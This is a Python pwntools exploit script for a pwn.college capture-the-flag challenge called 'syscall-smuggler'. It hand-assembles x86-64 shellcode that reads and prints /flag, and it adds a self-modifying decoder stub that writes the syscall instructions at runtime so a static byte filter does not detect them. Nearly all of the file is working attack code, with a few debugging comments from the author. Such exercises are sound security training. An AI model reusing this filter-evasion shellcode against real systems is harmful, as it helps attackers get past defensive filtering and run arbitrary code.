# the related url is https://pwn.college/program-security/program-security/

# Self-modifying shellcode to bypass syscall filter
# Strategy: Write syscall bytes (\x0f\x05) at runtime to avoid static detection

# First, build the main shellcode with placeholders to calculate positions
main_code = b""

# Build "/flag"
main_code += b"\x31\xc0"  # xor eax, eax
main_code += b"\x50"  # push rax
main_code += b"\xc6\x04\x24\x2f"  # mov byte [rsp], 0x2f
main_code += b"\xc7\x44\x24\x01\x66\x6c\x61\x67"  # mov dword [rsp+1], "flag"

# open(rsp, 0, 0)
main_code += b"\x54"  # push rsp
main_code += b"\x5f"  # pop rdi
main_code += b"\x31\xf6"  # xor esi, esi
main_code += b"\x31\xd2"  # xor edx, edx
main_code += b"\xb0\x02"  # mov al, 2
syscall_offset_1 = len(main_code)  # Position of first syscall
main_code += b"\x90\x90"  # NOP placeholder (will become syscall)

# read(fd, rsp, 60)
main_code += b"\x50"  # push rax (fd)
main_code += b"\x54"  # push rsp (buffer)
main_code += b"\x5e"  # pop rsi
main_code += b"\x5f"  # pop rdi
main_code += b"\xb2\x3c"  # mov dl, 60
main_code += b"\x31\xc0"  # xor eax, eax
syscall_offset_2 = len(main_code)  # Position of second syscall
main_code += b"\x90\x90"  # NOP placeholder (will become syscall)

# write(1, rsp, rax)
main_code += b"\x6a\x01"  # push 1
main_code += b"\x5f"  # pop rdi
main_code += b"\x89\xc2"  # mov edx, eax
main_code += b"\xb0\x01"  # mov al, 1
syscall_offset_3 = len(main_code)  # Position of third syscall
main_code += b"\x90\x90"  # NOP placeholder (will become syscall)

# exit
main_code += b"\xb0\x3c"  # mov al, 60
main_code += b"\x31\xff"  # xor edi, edi
syscall_offset_4 = len(main_code)  # Position of fourth syscall
main_code += b"\x90\x90"  # NOP placeholder (will become syscall)

# ============================================
# DECODER STUB: Writes syscall instructions at runtime
# ============================================

# Each write operation is 4 bytes: \xc6\x43 [offset] [value]
# We have 4 syscalls, each needs 2 writes (2 bytes), so 8 writes total = 32 bytes
# Plus initial 6 bytes for call/pop = 38 bytes total decoder

decoder_prologue = b"\xe8\x00\x00\x00\x00"  # call next instruction (5 bytes)
decoder_prologue += b"\x5b"  # pop rbx (1 byte) - RBX now points here (offset 5)

# For now, let me try a different approach: calculate the offset from RBX directly
# RBX will be at offset 5 in final shellcode
# We need to calculate where each syscall will be in the final shellcode:

# Position in final shellcode:
# 0-4: call instruction
# 5: pop rbx (RBX points here)
# 6-37: decoder writes (32 bytes)
# 38+: main code starts

# So in final shellcode:
# - First syscall is at: 38 + syscall_offset_1
# - From RBX (at 5): offset = (38 + syscall_offset_1) - 5 = 33 + syscall_offset_1

# This is what I have! So why is it writing to 0x1d (29)?
# Unless... let me check if syscall_offset_1 is negative? No, that can't be.
#
# Let me just recalculate knowing the decoder_writes size exactly:
decoder_writes_size = 32  # 8 writes * 4 bytes each
total_decoder_size = 6 + decoder_writes_size  # = 38

# RBX points to offset 5 (the pop instruction)
# Main code starts at offset total_decoder_size = 38
# Offset from RBX to main code start:
base_offset = total_decoder_size - 5  # = 38 - 5 = 33

offset_1 = base_offset + syscall_offset_1
offset_2 = base_offset + syscall_offset_2
offset_3 = base_offset + syscall_offset_3
offset_4 = base_offset + syscall_offset_4

print(
    f"[DEBUG] syscall_offset_1 = {syscall_offset_1}, base_offset = {base_offset}, offset_1 = {offset_1} (0x{offset_1:02x})"
)
print(
    f"[DEBUG] syscall_offset_2 = {syscall_offset_2}, offset_2 = {offset_2} (0x{offset_2:02x})"
)
print(
    f"[DEBUG] syscall_offset_3 = {syscall_offset_3}, offset_3 = {offset_3} (0x{offset_3:02x})"
)
print(
    f"[DEBUG] syscall_offset_4 = {syscall_offset_4}, offset_4 = {offset_4} (0x{offset_4:02x})"
)

# Build the decoder writes
decoder_writes = b""
# Syscall 1
decoder_writes += (
    b"\xc6\x43" + bytes([offset_1]) + b"\x0f"
)  # mov byte [rbx+offset], 0x0f
decoder_writes += (
    b"\xc6\x43" + bytes([offset_1 + 1]) + b"\x05"
)  # mov byte [rbx+offset+1], 0x05

# Syscall 2
decoder_writes += b"\xc6\x43" + bytes([offset_2]) + b"\x0f"
decoder_writes += b"\xc6\x43" + bytes([offset_2 + 1]) + b"\x05"

# Syscall 3
decoder_writes += b"\xc6\x43" + bytes([offset_3]) + b"\x0f"
decoder_writes += b"\xc6\x43" + bytes([offset_3 + 1]) + b"\x05"

# Syscall 4
decoder_writes += b"\xc6\x43" + bytes([offset_4]) + b"\x0f"
decoder_writes += b"\xc6\x43" + bytes([offset_4 + 1]) + b"\x05"

decoder = decoder_prologue + decoder_writes

# Combine decoder and main code
shellcode = decoder + main_code

# Verify NO syscall-related bytes (the new filter requirement!)
assert b"\x0f\x05" not in shellcode, "ERROR: syscall bytes found!"
assert b"\x0f\x34" not in shellcode, "ERROR: sysenter bytes found!"
assert b"\xcd\x80" not in shellcode, "ERROR: int 0x80 bytes found!"

print(f"[+] Shellcode size: {len(shellcode)} bytes")
print(f"[+] Decoder size: {len(decoder)} bytes")
print(f"[+] Main code size: {len(main_code)} bytes")
print(
    f"[+] Syscall positions: {syscall_offset_1}, {syscall_offset_2}, {syscall_offset_3}, {syscall_offset_4}"
)
print(f"[+] All syscall filters bypassed!")

# Run
from pwn import *

io = process("/challenge/syscall-smuggler")
io.send(shellcode)
io.interactive()
